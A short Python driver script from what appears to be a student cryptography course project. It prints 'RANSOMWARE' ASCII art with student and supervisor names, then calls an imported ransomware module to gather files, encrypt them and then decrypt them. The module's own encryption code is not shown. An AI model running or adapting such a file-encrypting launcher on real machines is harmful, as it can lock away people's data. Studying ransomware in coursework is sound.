from ransomware import ransomware
class colors:
    def __init__(self):
        self.blue = "\033[94m"
        self.red = "\033[91m"
        self.color="\033[93m"
        self.green= "\033[92m"
        self.end = "\033[0m"
cl = colors()
print(cl.blue + """
\t
\t               |
\t               |
\t          -----+------        -----------
\t               |                                   
\t               |
\t    )                                           (
\t    \ \                                       / /
\t     \ |\                                   / |/
\t      \|  \           RANSOMWARE            / /
\t       \   |\         **FC421**          / | /
\t        \  |  \_______________________/   | /
\t         \ |    |      |      |      |    |/
\t          \|    |      |      |      |    /
\t           \____|______|______|______|___/
\t             FC421 CRYPTOGRAPHY PROJECT
\t            For: Dr.Mohammad Abdulrahman
""" + cl.green+"\t\t\t\tBY:Renad,Haya,Sondos,Mariam\n")
#initialize the file lists
list_f = []
list_d = []
print(cl.color+"ENCRYPTING FILES ;(" + cl.end)
#call encryption process
ransomware.encryptor(ransomware.getFile(list_f))
#call decryption process
ransomware.decrypt(ransomware.getFile(list_d))